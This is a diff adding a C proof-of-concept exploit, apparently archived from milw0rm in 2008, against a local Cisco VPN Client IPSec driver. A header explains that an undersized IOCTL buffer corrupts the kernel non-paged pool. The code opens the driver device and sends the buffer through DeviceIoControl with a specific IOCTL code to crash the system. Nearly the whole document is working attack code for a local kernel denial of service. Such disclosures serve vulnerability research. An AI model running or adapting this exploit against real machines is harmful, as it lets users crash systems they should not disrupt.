@@ -1,0 +1,76 @@
+/* cpndrv-dos.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Cisco Systems VPN Client IPSec Driver local kernel system pool corruption POC
+ * by mu-b - Sat 11 Jan 2008
+ *
+ * - Tested on: CVPNDRVA.sys 5.0.02.0090
+ *
+ * specifying an input buffer size less-than 8+31-bytes results in the
+ * local kernel non-paged pool (METHOD_BUFFERED) being corrupted with
+ * uninitialised (dangling) kernel stack memory via an inline memcpy.
+ *
+ * Compile: MinGW + -lntdll
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+#include <ddk/ntapi.h>
+
+#define CVPN_IOCTL    0x80002038
+#define CVPN_LEN      0x10       /* n < 8 + 31 */
+
+struct ioctl_req {
+  char arg[CVPN_LEN];
+};
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  HANDLE hFile;
+  BOOL result;
+  DWORD rlen;
+
+  printf ("Cisco VPN Client IPSec Driver local kernel system pool corruption PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  hFile = CreateFileA ("\\\\.\\CVPNDRVA", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&req, 0x00, sizeof req);
+  req.arg[0] = 0x69;
+
+  /* corrupt the system pool */
+  printf ("* hitting.. [sizeof: %d]\n", sizeof req);
+  Sleep (5000);
+
+  result = DeviceIoControl (hFile, CVPN_IOCTL,
+                            &req, sizeof req, &req, sizeof req, &rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("done\n\n"
+          "* hmmm, you didn't STOP the box?!?!\n");
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-01-15]
